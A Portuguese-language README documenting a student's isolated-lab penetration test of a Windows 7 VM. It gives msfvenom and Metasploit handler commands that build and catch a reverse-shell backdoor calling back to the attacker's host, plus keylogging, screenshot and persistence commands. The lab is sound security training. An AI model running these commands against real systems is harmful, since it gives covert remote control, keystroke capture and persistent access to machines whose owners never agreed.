# 🛡️ Lab de Pentest: Análise de Acesso Remoto com Metasploit

[![Status](https://img.shields.io/badge/Status-Concluído-green.svg)]()
[![Propósito](https://img.shields.io/badge/Propósito-Educação%20e%20Treinamento-blue.svg)]()
[![Ferramenta Principal](https://img.shields.io/badge/Ferramenta-Metasploit%20Framework-red.svg?logo=kali-linux&logoColor=white)]()

---

## 🎯 Objetivo da Simulação

Este projeto documenta o estudo de caso de um **Teste de Invasão (Pentest)** realizado em um ambiente de laboratório virtualizado. O objetivo principal foi:

1.  Gerar e entregar um **payload reverso** (`reverse_tcp`) para obter uma sessão Meterpreter.
2.  Demonstrar as capacidades de **Pós-Exploração** (coleta de informações, persistência) após o acesso inicial.

---

## 🧪 Ambiente e Configuração

O teste foi conduzido em uma rede isolada, garantindo a ética e a segurança da simulação.

| Sistema | Sistema Operacional | IP (Rede Interna) | Função |
| :--- | :--- | :--- | :--- |
| **Atacante (Attacker)** | Kali Linux | `192.168.100.10` | Execução do Listener e Geração do Payload |
| **Alvo (Target)** | Windows 7  | `192.168.100.20` | Máquina Alvo com vulnerabilidade simulada (Execução Inadvertida) |

* **Virtualização:** Oracle VirtualBox.
* **Rede:** Configurada em modo "Rede Interna" para isolamento completo.

---

## 💻 Metodologia do Ataque (Passos Chave)

A exploração foi dividida em três etapas principais: Geração, Entrega e Execução/Pós-Exploração.

### 1. Geração e Entrega do Payload (`msfvenom`)

Utilização do `msfvenom` para criar um binário executável (EXE) que, ao ser executado na vítima, iniciaria uma conexão reversa ao Kali Linux.

```bash
# Geração do Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe -o backdoor.exe
```

A entrega do arquivo `backdoor.exe` foi simulada via um simples **Python HTTP Server** rodando no Kali, acessado pelo navegador da máquina Windows.

O payload foi disponibilizado para download e execução na máquina vítima.

### 2. Configuração e Execução do Listener (Metasploit)

O módulo `exploit/multi/handler` foi configurado no Metasploit para "escutar" a conexão reversa que viria da máquina alvo.

```bash
# Configuração do Handler no Metasploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.10
set LPORT 4444
run
```

Após a execução do payload na máquina Windows, uma sessão Meterpreter foi estabelecida com sucesso.

### 3. Pós-Exploração e Comandos

Com a sessão Meterpreter aberta, foram executados diversos comandos para demonstrar a capacidade de acesso e controle sobre a máquina vítima.



**Comandos de Estudo Executados:**

| Comando | Propósito |
| :--- | :--- |
| `sysinfo`, `getuid` | Coleta de informações do sistema e privilégios do usuário. |
| `screenshot` | Demonstração da capacidade de captura visual da tela do alvo. |
| `shell` | Abertura de um prompt de comando (CLI) padrão do sistema alvo. |
| `keyscan_start` / `keyscan_dump` | Estudo de keylogging, com captura de teclas digitadas. |
| **Persistência (Opcional):** `run persistence -U -i 5 -p 4444 -r 192.168.100.10` | Estudo de como manter o acesso ao sistema alvo após o reinício. |

### 4. Evidências de Acesso e Controll

As seguintes imagens comprovam o sucesso das operações de pós-exploração:

* **Screenshot da Máquina Vítima:**
Pelo comando screenshot

* **Verificação de Conexão (netstat na Vítima):**
pelo comando netstat -ano

---

## 💡 Conclusão e Lições Aprendidas

Este exercício validou o entendimento sobre a exploração de sistemas através da execução de código malicioso e demonstrou a capacidade de realizar ações de pós-exploração.

**Processo de Estudo Aprofundado:**

O estudo foi iniciado a partir da **teoria de Backdoors** presente em PDFs do professor. A utilização de ferramentas como o **Copilot** (IA) foi fundamental para:

* **Aprofundar** o conhecimento teórico, buscando exemplos práticos e explicações detalhadas sobre os comandos do Metasploit.
* **Agilizar** a compreensão do fluxo prático de ataque e pós-exploração, transformando teoria em prática de forma eficiente.

**Principais Aprendizados:**

* **Compreensão Prática de Backdoor:** Entendimento de como o código malicioso se comunica com o atacante (reverse connection) após o acesso inicial.
* **Defesa em Camadas:** A importância de restringir a execução de arquivos e a vigilância na rede para prevenir ataques semelhantes.
* **Segmentação:** Confirmação da necessidade de isolamento em ambientes de teste, e como a segmentação de rede é crucial em ambientes de produção.

---

## 🔑 Créditos e Aviso Legal

Desenvolvido por **Tiago de Aquino Nunes** para fins de estudo e aprimoramento em Cibersegurança.

**Ferramentas Utilizadas:** Kali Linux, Metasploit Framework, msfvenom, Python HTTP Server, Oracle VirtualBox.

**AVISO LEGAL:** Este repositório é estritamente **EDUCACIONAL**. O uso de quaisquer ferramentas ou técnicas aqui documentadas em sistemas sem autorização prévia e explícita é **ilegal e antiético**. Eu (Tiago) não me responsabilizo por qualquer uso indevido deste material.
